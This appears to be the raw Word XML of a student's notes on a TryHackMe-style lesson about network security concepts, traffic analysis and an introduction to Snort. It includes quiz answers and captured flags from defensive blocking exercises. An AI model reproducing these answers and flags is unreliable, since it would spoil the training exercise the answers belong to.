          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4AF997D9"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Task 2: Network Security and Network Data</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6443413D"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 xml:space="preserve">The main concern of Network Security focuses on two subjects: authentication and authorization. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="032AA019"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Network security control levels are divided into physical, technical, and administrative categories. Physical security prevents unauthorized access to devices and components. Technical security focuses on protecting data from unauthorized access, while administrative security ensures consistent security operations through policies and authentication.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="154C97E1" w14:textId="77777777" w:rsidR="00340C7C" w:rsidRPr="00340C7C" w:rsidRDefault="00340C7C" w:rsidP="00340C7C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="366B6071"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The two main approaches are Access Control and Threat Control. Access Control manages who can access network resources, while Threat Control detects and prevents malicious activities on the network.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="505FA764" w14:textId="77777777" w:rsidR="00340C7C" w:rsidRPr="00340C7C" w:rsidRDefault="00340C7C" w:rsidP="00340C7C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="00A58717"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lastRenderedPageBreak/>
        <w:t>Key elements of Access Control include firewalls, network access control, identity management, load balancing, network segmentation, VPNs, and the Zero Trust model, which limits access to the minimum necessary.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="693C3613" w14:textId="77777777" w:rsidR="00340C7C" w:rsidRPr="00340C7C" w:rsidRDefault="00340C7C" w:rsidP="00340C7C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="45F36400"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Threat Control includes intrusion detection and prevention, data loss prevention, endpoint protection, cloud security, security information management, automation and response, and network traffic analysis to detect anomalies and threats.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="255024ED" w14:textId="77777777" w:rsidR="00340C7C" w:rsidRPr="00340C7C" w:rsidRDefault="00340C7C" w:rsidP="00340C7C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0EA5522C"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Network security management involves deployment, configuration, management, monitoring, and maintenance, which include installing devices, setting up features, implementing security policies, tracking threats, and making updates.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="774E0CB1" w14:textId="77777777" w:rsidR="00340C7C" w:rsidRPr="00340C7C" w:rsidRDefault="00340C7C" w:rsidP="00340C7C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0849D0AD"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Managed Security Services (MSS) are outsourced to Managed Security Service Providers (MSSPs) to support organizations without the resources to manage security in-house. MSS includes penetration testing, vulnerability assessments, incident response, and behavioral analysis to detect and manage threats.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12D71F65" w14:textId="77777777" w:rsidR="00340C7C" w:rsidRPr="00340C7C" w:rsidRDefault="00340C7C" w:rsidP="00340C7C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="61DC0F0D" w14:textId="388DAE6C"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Which Security Control Level covers include creating security policies?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="523A49C0"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 Administrative</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="212C3766"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Which Access Control element works with data metrics to manage data flow?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38560611"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 Load Balancing</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="573394FD"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Which technology helps correlate different tool outputs and data sources?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70E78D71"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 SOAR</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E2A1897" w14:textId="2E6935EF" w:rsidR="00340C7C" w:rsidRPr="00340C7C" w:rsidRDefault="00340C7C" w:rsidP="00340C7C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00340C7C">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>- Automates tasks between various tools, data, and people</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FFE5277" w14:textId="77777777" w:rsidR="00340C7C" w:rsidRPr="00340C7C" w:rsidRDefault="00340C7C" w:rsidP="00340C7C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4AAE7194"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Task 3: Traffic Analysis</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21480625" w14:textId="77777777" w:rsidR="00340C7C" w:rsidRPr="00340C7C" w:rsidRDefault="00340C7C" w:rsidP="00340C7C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="632088F0"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 xml:space="preserve">Traffic Analysis is a method of intercepting, monitoring, and analyzing network data. There are two main techniques: Flow Analysis and Packet Analysis. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="723254AC"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Flow analysis collects data and evidence from networking devices. It aims to provide statistical results.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FE7437F"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Pack analysis collects all available network data. It applies in-depth packet-level investigation (DPI).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3615201A" w14:textId="77777777" w:rsidR="00340C7C" w:rsidRPr="00340C7C" w:rsidRDefault="00340C7C" w:rsidP="00340C7C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="637D4B6D" w14:textId="77777777"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Block the bad traffic IP address to obtain the flag.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B0CAEE8" w14:textId="2363507E" w:rsidR="006B2109" w:rsidRDefault="006B2109" w:rsidP="006B2109">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:num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25705D" wp14:editId="4C8C3D66">
            <wp:extent cx="3649980" cy="2857500"/>
            <wp:effectExtent l="0" t="0" r="7620" b="0"/>
            <wp:docPr id="1327851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9980" cy="2857500"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="5191E7A1" w14:textId="19B833B6" w:rsidR="006B2109" w:rsidRPr="006B2109" w:rsidRDefault="006B2109" w:rsidP="006B2109">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="404040" w:themeColor="text1" w:themeTint="BF"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006B2109">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="404040" w:themeColor="text1" w:themeTint="BF"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>Figure 1.1: List of IP addresses with the traffic associated for Task 3</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6030A52A" w14:textId="42E2300E" w:rsidR="00340C7C" w:rsidRPr="00340C7C" w:rsidRDefault="006B2109" w:rsidP="006B2109">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Flag: </w:t>
      </w:r>
      <w:r w:rsidR="00340C7C" w:rsidRPr="00340C7C">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>THM{PACKET_MASTER}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="453D1A4B" w14:textId="74ED3530" w:rsidR="00340C7C" w:rsidRPr="00340C7C" w:rsidRDefault="00340C7C" w:rsidP="00340C7C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="54268783" w14:textId="470A0A51" w:rsidR="00340C7C" w:rsidRPr="00340C7C" w:rsidRDefault="00340C7C" w:rsidP="00340C7C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00340C7C">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Do the same for </w:t>
      </w:r>
      <w:r w:rsidR="006B2109" w:rsidRPr="00340C7C">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>level 2</w:t>
      </w:r>
      <w:r w:rsidRPr="00340C7C">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> except block three destination ports. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65298561" w14:textId="5A2C5FED" w:rsidR="00340C7C" w:rsidRPr="00340C7C" w:rsidRDefault="006B2109" w:rsidP="006B2109">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:num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18EB0220" wp14:editId="1EF18DB2">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="column">
                  <wp:posOffset>6916420</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>-556260</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="373380" cy="2120900"/>
                <wp:effectExtent l="38100" t="38100" r="45720" b="50800"/>
                <wp:wrapNone/>
                <wp:docPr id="265063942" name="Ink 27"/>
                <wp:cNvGraphicFramePr/>
                <a:graphic xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
                  <a:graphicData uri="http://schemas.microsoft.com/office/word/2010/wordprocessingInk">
                    <w14:contentPart bwMode="auto" r:id="rId10">
                      <w14:nvContentPartPr>
                        <w14:cNvContentPartPr/>
                      </w14:nvContentPartPr>
                      <w14:xfrm>
                        <a:off x="0" y="0"/>
                        <a:ext cx="373380" cy="2120900"/>
                      </w14:xfrm>
                    </w14:contentPart>
                  </a:graphicData>
                </a:graphic>
              </wp:anchor>
            </w:drawing>
          </mc:Choice>
          <mc:Fallback>
            <w:pict>
              <v:shapetype w14:anchorId="75BD97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544.1pt;margin-top:-44.3pt;width:30.35pt;height:167.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">
                <v:imagedata r:id="rId11" o:titl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082A1B8" wp14:editId="545482C2">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="column">
                  <wp:posOffset>4069440</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>1646420</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="548640" cy="365760"/>
                <wp:effectExtent l="57150" t="19050" r="80010" b="91440"/>
                <wp:wrapNone/>
                <wp:docPr id="451821645" name="Rectangle 21"/>
                <wp:cNvGraphicFramePr/>
                <a:graphic xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
                  <a:graphicData uri="http://schemas.microsoft.com/office/word/2010/wordprocessingShape">
                    <wps:wsp>
                      <wps:cNvSpPr/>
                      <wps:spPr>
                        <a:xfrm>
                          <a:off x="0" y="0"/>
                          <a:ext cx="548640" cy="365760"/>
                        </a:xfrm>
                        <a:prstGeom prst="rect">
                          <a:avLst/>
                        </a:prstGeom>
                        <a:solidFill>
                          <a:srgbClr val="E71224">
                            <a:alpha val="5000"/>
                          </a:srgbClr>
                        </a:solidFill>
                        <a:ln w="126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A5CEE" id="Rectangle 21" o:spid="_x0000_s1026" style="position:absolute;margin-left:320.45pt;margin-top:129.65pt;width:43.2pt;height:28.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" fillcolor="#e71224" strokecolor="#e71224" strokeweight=".35mm">
                <v:fill opacity="3341f"/>
                <v:shadow on="t" color="black" opacity="22937f" origin=",.5" offset="0,.63889mm"/>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7FBFB4C" wp14:editId="2118F369">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="column">
                  <wp:posOffset>4068360</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>897620</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="548640" cy="365760"/>
                <wp:effectExtent l="57150" t="19050" r="80010" b="91440"/>
                <wp:wrapNone/>
                <wp:docPr id="93491167" name="Rectangle 17"/>
                <wp:cNvGraphicFramePr/>
                <a:graphic xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
                  <a:graphicData uri="http://schemas.microsoft.com/office/word/2010/wordprocessingShape">
                    <wps:wsp>
                      <wps:cNvSpPr/>
                      <wps:spPr>
                        <a:xfrm>
                          <a:off x="0" y="0"/>
                          <a:ext cx="548640" cy="365760"/>
                        </a:xfrm>
                        <a:prstGeom prst="rect">
                          <a:avLst/>
                        </a:prstGeom>
                        <a:solidFill>
                          <a:srgbClr val="E71224">
                            <a:alpha val="5000"/>
                          </a:srgbClr>
                        </a:solidFill>
                        <a:ln w="126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48FB3" id="Rectangle 17" o:spid="_x0000_s1026" style="position:absolute;margin-left:320.35pt;margin-top:70.7pt;width:43.2pt;height:2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" fillcolor="#e71224" strokecolor="#e71224" strokeweight=".35mm">
                <v:fill opacity="3341f"/>
                <v:shadow on="t" color="black" opacity="22937f" origin=",.5" offset="0,.63889mm"/>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E4D58D6" wp14:editId="16069474">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="column">
                  <wp:posOffset>4080600</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>375260</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="365760" cy="365760"/>
                <wp:effectExtent l="57150" t="19050" r="72390" b="91440"/>
                <wp:wrapNone/>
                <wp:docPr id="2019086330" name="Rectangle 9"/>
                <wp:cNvGraphicFramePr/>
                <a:graphic xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
                  <a:graphicData uri="http://schemas.microsoft.com/office/word/2010/wordprocessingShape">
                    <wps:wsp>
                      <wps:cNvSpPr/>
                      <wps:spPr>
                        <a:xfrm>
                          <a:off x="0" y="0"/>
                          <a:ext cx="365760" cy="365760"/>
                        </a:xfrm>
                        <a:prstGeom prst="rect">
                          <a:avLst/>
                        </a:prstGeom>
                        <a:solidFill>
                          <a:srgbClr val="E71224">
                            <a:alpha val="5000"/>
                          </a:srgbClr>
                        </a:solidFill>
                        <a:ln w="126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12003" id="Rectangle 9" o:spid="_x0000_s1026" style="position:absolute;margin-left:321.3pt;margin-top:29.55pt;width:28.8pt;height:28.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" fillcolor="#e71224" strokecolor="#e71224" strokeweight=".35mm">
                <v:fill opacity="3341f"/>
                <v:shadow on="t" color="black" opacity="22937f" origin=",.5" offset="0,.63889mm"/>
              </v:rect>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="2D3E42BB" wp14:editId="4C02CEE4">
            <wp:extent cx="3688080" cy="2362200"/>
            <wp:effectExtent l="0" t="0" r="7620" b="0"/>
            <wp:docPr id="1913459923" name="Picture 7" descr="A table with numbers and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9923" name="Picture 7" descr="A table with numbers and a blue background&#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8080" cy="2362200"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="4787E26E" w14:textId="369F2EB7" w:rsidR="006B2109" w:rsidRPr="006B2109" w:rsidRDefault="006B2109" w:rsidP="006B2109">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="404040" w:themeColor="text1" w:themeTint="BF"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006B2109">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="404040" w:themeColor="text1" w:themeTint="BF"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>Figure 1.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="404040" w:themeColor="text1" w:themeTint="BF"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>2</w:t>
      </w:r>
      <w:r w:rsidRPr="006B2109">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="404040" w:themeColor="text1" w:themeTint="BF"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">: List of IP addresses </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="404040" w:themeColor="text1" w:themeTint="BF"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>and ports</w:t>
      </w:r>
      <w:r w:rsidRPr="006B2109">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="404040" w:themeColor="text1" w:themeTint="BF"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> for Task </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="404040" w:themeColor="text1" w:themeTint="BF"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>4</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04EAB9D8" w14:textId="7A86BD2E" w:rsidR="0028613E" w:rsidRDefault="00340C7C" w:rsidP="006B2109">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00340C7C">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>THM{DETECTION_MASTER}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1292BE6B" w14:textId="77777777" w:rsidR="006B2109" w:rsidRPr="00512FED" w:rsidRDefault="006B2109" w:rsidP="006B2109">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7F89BB3E" w14:textId="289523D4" w:rsidR="004A3F6D" w:rsidRDefault="006B2109" w:rsidP="00512FED">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Snort</w:t>
      </w:r>
      <w:r w:rsidR="004A3F6D">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CC3FB62" w14:textId="77777777" w:rsidR="006B2109" w:rsidRDefault="006B2109" w:rsidP="00512FED">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6BC7984B" w14:textId="77777777" w:rsidR="006B2109" w:rsidRDefault="006B2109" w:rsidP="006B2109">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="006B2109">
        <w:t>Task 1: Introduction</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62B94B6A" w14:textId="77777777" w:rsidR="006B2109" w:rsidRPr="006B2109" w:rsidRDefault="006B2109" w:rsidP="006B2109">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6E53153F" w14:textId="725E9936" w:rsidR="006B2109" w:rsidRPr="000A02A9" w:rsidRDefault="006B2109" w:rsidP="006B2109">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="006B2109">
        <w:t xml:space="preserve">An expectation of basic familiarity with Linux </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006B2109">
        <w:t>cmd</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="006B2109">
        <w:t xml:space="preserve">-line functionalities is needed for this section. SNORT is an open-source, rule-based Network IDS and Network IPS. </w:t>
      </w:r>
      <w:r w:rsidR="000A02A9">
        <w:t xml:space="preserve">The official description of snort: </w:t>
      </w:r>
      <w:r w:rsidR="000A02A9">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>“</w:t>
      </w:r>
      <w:r w:rsidRPr="000A02A9">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve">Snort is the foremost </w:t>
      </w:r>
      <w:r w:rsidR="000A02A9" w:rsidRPr="000A02A9">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>Open-Source</w:t>
      </w:r>
      <w:r w:rsidRPr="000A02A9">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> Intrusion Prevention System (IPS) in </w:t>
      </w:r>
      <w:r w:rsidRPr="000A02A9">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>the world. Snort IPS uses a series of rules that help define malicious network activity and uses those rules to find packets that match against them and generate alerts for users."</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="046308BA" w14:textId="77777777" w:rsidR="006B2109" w:rsidRPr="006B2109" w:rsidRDefault="006B2109" w:rsidP="006B2109">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="66527E57" w14:textId="77777777" w:rsidR="006B2109" w:rsidRPr="006B2109" w:rsidRDefault="006B2109" w:rsidP="006B2109">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="006B2109">
